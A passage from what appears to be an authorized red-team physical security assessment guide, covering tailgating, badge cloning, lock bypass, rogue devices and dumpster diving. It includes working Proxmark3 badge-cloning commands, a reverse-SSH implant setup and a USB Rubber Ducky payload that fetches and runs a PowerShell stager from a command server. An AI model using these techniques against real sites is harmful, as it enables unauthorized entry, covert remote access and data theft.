\subtree{
\title{Technique 1: Tailgating}
\p{Tailgating involves following an authorized person through a secured entry point without presenting credentials.}

\p{\strong{Methods:}}

\ul{
\li{\strong{Hands full approach}: Carry boxes/equipment, ask someone to hold the door}
\li{\strong{Smoke break return}: Wait near smoking area, follow employees back inside}
\li{\strong{Delivery driver}: Wear delivery uniform, carry packages}
\li{\strong{Busy entrance timing}: Enter during shift change or lunch rush}
\li{\strong{Door propping}: Observe if employees prop doors open}
}

\p{\strong{Countermeasures to test:}}

\ul{
\li{Turnstiles / mantraps}
\li{Security guard challenge procedures}
\li{Piggybacking detection systems}
\li{Employee security awareness}
}
}

\subtree{
\title{Technique 2: Badge Cloning}
\pre{\startverb
# Proxmark3 - Read a low-frequency (125kHz) HID card
proxmark3> lf hid read
# Output: HID Prox TAG ID: 2006xxxxxx - FC: 123 CN: 45678

# Clone to a T5577 blank card
proxmark3> lf hid clone --fc 123 --cn 45678

# Read high-frequency (13.56MHz) MIFARE card
proxmark3> hf mf rdbl --blk 0 -k FFFFFFFFFFFF

# Long-range capture with custom antenna (up to 3 feet)
proxmark3> lf hid read  # with extended antenna

# Flipper Zero - Read and emulate
# RFID > Read > Hold card to Flipper > Save > Emulate
\stopverb}

\p{\strong{Badge cloning attack flow:}}

\ol{
\li{Position near badge reader (elevator, door entry)}
\li{Read badge wirelessly as employee passes (1-3 second window)}
\li{Clone to blank card}
\li{Use cloned badge to access secured areas}
\li{Document which areas were accessible}
}
}

\subtree{
\title{Technique 3: Lock Bypassing}
\pre{\startverb
| Lock Type | Bypass Method | Difficulty |
|---|---|---|
| Pin tumbler (standard) | Pick, rake, or bump key | Easy-Medium |
| Wafer lock (filing cabinets) | Pick or jiggle | Easy |
| Tubular lock (vending, server) | Tubular pick tool | Easy |
| Electronic lock (keypad) | Shoulder surf, thermal camera | Medium |
| Magnetic lock (mag lock) | Under-door tool, REX sensor bypass | Medium |
| Smart lock (Bluetooth) | Replay attack, firmware exploit | Hard |
\stopverb}

\pre{\startverb
# Electronic keypad - thermal imaging after use
# Warmer keys = more recently pressed
# Use FLIR camera to capture heat signatures within 30 seconds

# REX (Request to Exit) sensor bypass
# Insert thin wire or use a can of compressed air to trigger motion sensor
# on the inside of a mag-locked door
\stopverb}
}

\subtree{
\title{Technique 4: Rogue Device Deployment}
\pre{\startverb
# LAN Turtle - Plug into exposed Ethernet port
# Provides SSH reverse tunnel back to C2 server
# Auto-configures as man-in-the-middle

# Configure LAN Turtle for reverse SSH
# Module: AutoSSH
# Host: c2.redteam.com
# Port: 22
# Remote port: 2222

# WiFi Pineapple - Deploy in common area
# Captures wireless credentials via evil twin attack
# Exfiltrates data over cellular modem

# USB Rubber Ducky - Drop in parking lot or leave on desk
# Payload: Download and execute C2 agent
# Duckyscript:
# DELAY 1000
# GUI r
# DELAY 500
# STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://c2.redteam.com/stager.ps1')"
# ENTER
\stopverb}
}

\subtree{
\title{Technique 5: Dumpster Diving}
\p{Search external waste containers and recycling bins for:}

\ul{
\li{Printed documents with sensitive information}
\li{Employee directories and org charts}
\li{Network diagrams and IP addresses}
\li{Shredded documents (cross-cut vs strip-cut assessment)}
\li{Discarded hardware (hard drives, USB drives)}
}
}

\subtree{
\title{Assessment Methodology}
\subtree{
\title{Pre-Assessment Reconnaissance}
\ol{
\li{Perimeter walk - identify all entry points, cameras, guard posts}
\li{Observe employee patterns - shift changes, break schedules}
\li{Identify badge technology (HID, MIFARE, iCLASS)}
\li{Map camera coverage and blind spots}
\li{Note security guard patrol routes and timing}
}
}

\subtree{
\title{Execution Phases}
\ol{
\li{\strong{External perimeter}: Fencing, gates, parking barriers}
\li{\strong{Building entry}: Main entrance, side doors, loading dock}
\li{\strong{Internal access}: Floor access, elevator controls}
\li{\strong{Restricted areas}: Server rooms, executive offices, data centers}
\li{\strong{Device deployment}: Network implants, rogue wireless}
}
}

\subtree{
\title{Documentation Requirements}
\ul{
\li{Timestamp and location for every access attempt}
\li{Photos/video of successful entries}
\li{Badge reader locations that accepted cloned credentials}
\li{Unlocked doors, propped doors, tailgating opportunities}
\li{Network ports accessible in public areas}
\li{Evidence of data in waste containers}
}
}
}

\subtree{
\title{Ethical and Safety Considerations}
\ol{
\li{\strong{Always carry authorization letter} - Be prepared to identify yourself immediately if confronted}
\li{\strong{Never force entry} - If a technique damages property, document and skip}
\li{\strong{Immediate stop} if law enforcement is called before deconfliction}
\li{\strong{Never photograph individuals} without authorization}
\li{\strong{Document, don't exploit} - Take photos as evidence, don't steal actual data}
\li{\strong{Safety first} - Do not enter hazardous areas or bypass fire safety}
}
}

